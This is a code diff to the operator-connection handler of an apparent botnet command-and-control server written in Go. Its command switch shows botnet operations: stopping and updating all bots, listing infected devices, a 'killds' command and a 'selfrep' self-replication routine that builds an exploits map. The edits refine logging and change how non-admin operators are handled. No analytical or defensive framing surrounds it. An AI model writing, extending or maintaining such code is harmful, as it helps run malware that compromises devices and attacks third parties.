@@ -12,7 +12,7 @@ import (
 )
 
 func (m *Master) HandleConnection() {
-	utils.Debug(fmt.Sprintf("[*] New Master connected --> %s", m.Network.Socket.RemoteAddr()))
+	utils.Debug(fmt.Sprintf("[*] New Master connection etablished --> %s", m.Network.Socket.RemoteAddr()))
 	MasterList = append(MasterList, m)
 
 	defer func() {
@@ -57,6 +57,9 @@ func (m *Master) HandleConnection() {
 
 	go m.TaskUpdateTitle()
 	m.ClearConsole()
+
+	utils.Debug(fmt.Sprintf("[*] New Master connected --> %s", m.LoggedUser.Username))
+	fmt.Println(m.LoggedUser)
 
 	for m.Network.Connected {
 		m.Network.Send(fmt.Sprintf("%s@botnet: ", m.LoggedUser.Username))
@@ -105,7 +108,7 @@ func (m *Master) HandleConnection() {
 		case "!stop":
 			if !m.LoggedUser.Admin {
 				m.Network.Send(utils.FormatSocketString("  » Admin command"))
-				return
+				continue
 			}
 
 			ttl := m.SendToAllBot("!STOP")
@@ -113,7 +116,7 @@ func (m *Master) HandleConnection() {
 		case "update":
 			if !m.LoggedUser.Admin {
 				m.Network.Send(utils.FormatSocketString("  » Admin command"))
-				return
+				continue
 			}
 
 			ttl := m.SendToAllBot("!UPDATE")
@@ -121,7 +124,7 @@ func (m *Master) HandleConnection() {
 		case "device":
 			if !m.LoggedUser.Admin {
 				m.Network.Send(utils.FormatSocketString("  » Admin command"))
-				return
+				continue
 			}
 
 			for i, bot := range BotList {
@@ -134,7 +137,7 @@ func (m *Master) HandleConnection() {
 		case "killds":
 			if !m.LoggedUser.Admin {
 				m.Network.Send(utils.FormatSocketString("  » Admin command"))
-				return
+				continue
 			}
 
 			ttl := m.SendToAllBot("!KILLDS") // kill this shit !!
@@ -142,7 +145,7 @@ func (m *Master) HandleConnection() {
 		case "selfrep":
 			if !m.LoggedUser.Admin {
 				m.Network.Send(utils.FormatSocketString("  » Admin command"))
-				return
+				continue
 			}
 
 			Exploits := map[string]int{}
